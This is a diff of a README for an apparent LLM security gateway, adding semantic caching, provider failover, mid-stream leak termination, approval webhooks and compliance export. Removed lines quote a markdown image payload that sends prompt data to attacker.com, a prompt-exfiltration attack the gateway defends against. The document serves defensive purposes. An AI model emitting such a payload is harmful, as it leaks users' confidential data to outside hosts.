@@ -108,13 +108,25 @@ Teams are shipping LLM features and autonomous agentic workflows with almost zer
   - `Low`: Auto-allowed (e.g. `get_weather`, `search_faq`).
   - `High`: Gated into the **Approval Queue** (e.g. `delete_record`, `transfer_funds`, `send_email`, `execute_bash`). The application receives an intercept token while awaiting human operator sign-off via the dashboard or REST API.
 
-### 4. Portkey-Style Sub-ms Caching Layer
-- In-memory TTL cache with SHA256 prompt normalization.
-- Serves repeated queries in **< 1 ms**, saving upstream token expenses and shielding against provider outages.
+### 4. Portkey-Style Sub-ms Caching & Semantic Vector Cache
+- **Exact Match Caching**: In-memory TTL cache with SHA256 prompt normalization serving repeated queries in **< 1 ms**.
+- **Semantic Vector Caching**: TF-IDF n-gram vectors with cosine similarity matching semantically equivalent queries (e.g. *"What is the capital city of France?"* vs *"Tell me the capital of France"*), saving up to 80% on upstream token expenses.
 
-### 5. Outbound Leak & Dynamic Canary Defense
-- Request-scoped cryptographically random canary tokens (`rb_canary_<hex>`) injected into prompt context.
-- Neutralizes prompt exfiltration attempts and tracking pixel attacks (e.g. `![leak](https://attacker.com/leak?...)`).
+### 5. Multi-Provider Fallback & Circuit Breaker Router
+- Continuous circuit state monitoring (`CLOSED`, `OPEN`, `HALF_OPEN`) across providers.
+- When OpenAI suffers a 429 rate limit, 5xx outage, or network timeout, traffic automatically and transparently fails over to Anthropic or fallback mock pipelines without dropping client connections.
+
+### 6. Real-Time Mid-Stream Token Killer (SSE Abort on Leak)
+- Active sliding-window scanning of streaming server-sent events (SSE).
+- If a canary token or sensitive API credential appears mid-stream, the stream is **terminated immediately** (`[GATEWAY WAF: STREAM TERMINATED]`), preventing the confidential data from reaching the user's browser or terminal.
+
+### 7. Slack & Discord Webhooks for Tool Authorization
+- Real-time alerts dispatched to DevOps and Security Slack/Discord channels when a high-risk tool call is intercepted.
+- Includes embedded arguments preview and 1-click Approve/Reject links.
+
+### 8. One-Click Enterprise Compliance Audit Export (SOC 2, HIPAA, GDPR, PCI-DSS)
+- Instant cryptographically verifiable audit trail export in CSV and JSON formats via `/api/compliance/export`.
+- Maps every blocked attack, redacted PII token, and intercepted tool execution directly to compliance framework controls.
 
 ---
 
@@ -230,7 +242,11 @@ rules:
 Run all automated phase checks and benchmarks:
 
 ```bash
+# Run Core 8-Phase Pipeline Checkpoints
 python -m tests.run_all_checkpoints
+
+# Run Advanced Enterprise Verification (Semantic Cache, Circuit Breaker, Webhooks, Compliance, Token Killer)
+python -m tests.test_advanced_features
 ```
 
 ### Automated Benchmark Results
